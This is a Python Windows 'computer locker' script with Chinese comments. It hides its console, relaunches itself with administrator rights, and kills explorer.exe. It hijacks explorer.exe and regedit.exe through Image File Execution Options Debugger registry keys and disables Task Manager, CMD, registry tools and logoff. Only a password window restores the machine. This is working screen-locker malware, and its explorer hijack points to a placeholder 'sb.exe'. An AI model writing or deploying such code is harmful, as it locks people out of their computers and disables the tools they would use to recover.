import ctypes
import os
import sys
import winreg
import subprocess
import hashlib
import tkinter as tk
from tkinter import messagebox, simpledialog
import threading
import time

# 获取当前脚本所在目录
current_dir = os.path.dirname(os.path.abspath(__file__))

# 获取控制台窗口句柄并隐藏
kernel32 = ctypes.WinDLL('kernel32')
user32 = ctypes.WinDLL('user32')
hwnd = kernel32.GetConsoleWindow()
if hwnd:
    user32.ShowWindow(hwnd, 0)  # 隐藏控制台窗口

def is_admin():
    """检查是否以管理员权限运行"""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    """以管理员权限重新运行程序"""
    if not is_admin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit()

# 确保以管理员权限运行
run_as_admin()

def disable_logout(enable=False):
    """
    禁用或启用Windows注销功能
    :param enable: False表示禁用，True表示启用
    """
    try:
        # 打开或创建注册表项
        key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
        
        # 设置值：1表示禁用注销，0或删除表示启用
        winreg.SetValueEx(key, "StartMenuLogOff", 0, winreg.REG_DWORD, 1 if not enable else 0)
        
        return True
    except FileNotFoundError:
        # 如果键不存在则创建
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
        winreg.SetValueEx(key, "StartMenuLogOff", 0, winreg.REG_DWORD, 1 if not enable else 0)
        return True
    except Exception as e:
        print(f"禁用注销功能失败: {e}")
        return False
    finally:
        try:
            winreg.CloseKey(key)
        except:
            pass

def kill_explorer():
    """结束资源管理器"""
    try:
        # 使用taskkill命令结束explorer.exe
        os.system("taskkill /f /im explorer.exe")
        return True
    except Exception as e:
        print(f"结束进程失败: {e}")
        return False

def hijack_explorer(target_program):
    """
    通过注册表劫持explorer.exe
    :param target_program: 要劫持执行的程序路径
    """
    try:
        # 创建/打开IFEO注册表项
        key_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\explorer.exe"
        key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path)
        
        # 设置Debugger值为目标程序
        winreg.SetValueEx(key, "Debugger", 0, winreg.REG_SZ, target_program)
        return True
    except PermissionError:
        print("错误：需要管理员权限！")
        return False
    except Exception as e:
        print(f"劫持explorer失败: {e}")
        return False
    finally:
        try:
            winreg.CloseKey(key)
        except:
            pass

def disable_task_manager(enable=False):
    """禁用或启用任务管理器"""
    try:
        key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
        except FileNotFoundError:
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
        
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1 if not enable else 0)
        return True
    except Exception as e:
        print(f"禁用任务管理器失败: {e}")
        return False
    finally:
        try:
            winreg.CloseKey(key)
        except:
            pass

def disable_cmd_and_regedit(enable=False):
    """禁用或启用CMD和注册表编辑器"""
    try:
        key_path = r"SOFTWARE\Policies\Microsoft\Windows\System"
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
        except FileNotFoundError:
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
        
        winreg.SetValueEx(key, "DisableCMD", 0, winreg.REG_DWORD, 1 if not enable else 0)
        winreg.SetValueEx(key, "DisableRegistryTools", 0, winreg.REG_DWORD, 1 if not enable else 0)
        return True
    except Exception as e:
        print(f"禁用CMD和注册表失败: {e}")
        return False
    finally:
        try:
            winreg.CloseKey(key)
        except:
            pass

def hijack_regedit(target_path):
    """劫持 regedit.exe 使其执行指定程序"""
    try:
        # 打开或创建 IFEO 注册表项
        key_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\regedit.exe"
        key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path)
        
        # 设置 Debugger 值为目标程序路径
        winreg.SetValueEx(key, "Debugger", 0, winreg.REG_SZ, target_path)
        return True
    except PermissionError:
        print("错误：需要管理员权限！")
        return False
    except Exception as e:
        print(f"劫持regedit失败: {e}")
        return False
    finally:
        try:
            winreg.CloseKey(key)
        except:
            pass

def restore_regedit():
    """恢复 regedit.exe 的默认行为（删除劫持）"""
    try:
        key_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\regedit.exe"
        winreg.DeleteKey(winreg.HKEY_LOCAL_MACHINE, key_path)
        return True
    except FileNotFoundError:
        return True  # 未检测到劫持，无需恢复
    except PermissionError:
        print("错误：需要管理员权限！")
        return False
    except Exception as e:
        print(f"恢复regedit失败: {e}")
        return False

def restore_explorer():
    """恢复 explorer.exe 的默认行为（删除劫持）"""
    try:
        key_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\explorer.exe"
        winreg.DeleteKey(winreg.HKEY_LOCAL_MACHINE, key_path)
        return True
    except FileNotFoundError:
        return True  # 未检测到劫持，无需恢复
    except PermissionError:
        print("错误：需要管理员权限！")
        return False
    except Exception as e:
        print(f"恢复explorer失败: {e}")
        return False

def restart_explorer():
    """重启资源管理器"""
    try:
        subprocess.Popen("explorer.exe")
        return True
    except Exception as e:
        print(f"重启资源管理器失败: {e}")
        return False

def apply_lock_settings():
    """应用所有锁定设置"""
    # 获取当前执行文件的路径
    current_exe = sys.executable
    
    # 执行所有锁定操作
    results = []
    results.append(("结束资源管理器", kill_explorer()))
    results.append(("劫持注册表编辑器", hijack_regedit(current_exe)))
    results.append(("禁用任务管理器", disable_task_manager(False)))
    results.append(("禁用CMD和注册表", disable_cmd_and_regedit(False)))
    results.append(("禁用注销功能", disable_logout(False)))
    results.append(("劫持资源管理器", hijack_explorer("sb.exe")))  # 这里应该是当前程序
    
    # 检查是否有失败的操作
    failed_operations = [op for op, success in results if not success]
    return len(failed_operations) == 0, failed_operations

def remove_lock_settings():
    """移除所有锁定设置"""
    results = []
    results.append(("恢复任务管理器", disable_task_manager(True)))
    results.append(("恢复注册表编辑器", restore_regedit()))
    results.append(("恢复CMD和注册表", disable_cmd_and_regedit(True)))
    results.append(("恢复资源管理器", restore_explorer()))
    results.append(("重启资源管理器", restart_explorer()))
    results.append(("恢复注销功能", disable_logout(True)))
    
    # 检查是否有失败的操作
    failed_operations = [op for op, success in results if not success]
    return len(failed_operations) == 0, failed_operations

def read_password_hash():
    """读取密码哈希值"""
    try:
        password_file = os.path.join(current_dir, 'password.txt')
        with open(password_file, 'r', encoding='utf-8') as file:
            return file.read().strip()
    except FileNotFoundError:
        messagebox.showerror("错误", "未找到密码文件，请先创建密码")
        sys.exit(1)
    except Exception as e:
        messagebox.showerror("错误", f"读取密码文件失败: {e}")
        sys.exit(1)

def create_password_gui():
    """创建密码输入GUI"""
    def check_password():
        entered_password = password_entry.get()
        if not entered_password:
            messagebox.showerror("错误", "请输入密码")
            return
            
        # 计算哈希值
        password_hash = hashlib.sha256(entered_password.encode('utf-8')).hexdigest()
        
        if password_hash == stored_password:
            success, failures = remove_lock_settings()
            if success:
                messagebox.showinfo("成功", "电脑已解锁！")
                root.destroy()
                sys.exit(0)
            else:
                messagebox.showwarning("部分成功", 
                    f"电脑已解锁，但以下操作未能完成:\n{', '.join(failures)}\n\n可能需要手动处理。")
                root.destroy()
                sys.exit(0)
        else:
            messagebox.showerror("错误", "密码错误！")
            password_entry.delete(0, tk.END)
    
    def on_closing():
        if messagebox.askyesno("确认", "确定要退出吗？电脑将保持锁定状态。"):
            root.destroy()
            sys.exit(0)
    
    # 创建主窗口
    root = tk.Tk()
    root.title("电脑锁定")
    root.geometry("400x200")
    root.resizable(False, False)
    root.configure(bg="#f0f0f0")
    root.protocol("WM_DELETE_WINDOW", on_closing)
    
    # 设置图标（如果有）
    icon_path = os.path.join(current_dir, "lock.ico")
    if os.path.exists(icon_path):
        root.iconbitmap(icon_path)
    
    # 创建界面元素
    title_label = tk.Label(root, text="电脑已被锁定", font=("Arial", 16, "bold"), bg="#f0f0f0", fg="#ff0000")
    title_label.pack(pady=10)
    
    instruction_label = tk.Label(root, text="请输入解锁密码：", font=("Arial", 12), bg="#f0f0f0")
    instruction_label.pack(pady=5)
    
    password_entry = tk.Entry(root, show="*", font=("Arial", 14), width=20)
    password_entry.pack(pady=10)
    password_entry.focus()
    
    # 绑定回车键
    password_entry.bind('<Return>', lambda event: check_password())
    
    submit_button = tk.Button(root, text="解锁", command=check_password, 
                             font=("Arial", 12), bg="#4CAF50", fg="white", width=10)
    submit_button.pack(pady=10)
    
    # 底部信息
    info_label = tk.Label(root, text="by 一只野生的win31 - Bilibili", 
                         font=("Arial", 8), bg="#f0f0f0", fg="#666666")
    info_label.pack(side=tk.BOTTOM, pady=5)
    
    # 读取存储的密码哈希
    stored_password = read_password_hash()
    
    # 运行GUI
    root.mainloop()

if __name__ == "__main__":
    # 应用锁定设置
    success, failures = apply_lock_settings()
    
    if not success:
        messagebox.showwarning("警告", 
            f"以下锁定操作未能完成:\n{', '.join(failures)}\n\n锁定可能不完整。")
    
    # 显示密码输入界面
    create_password_gui()
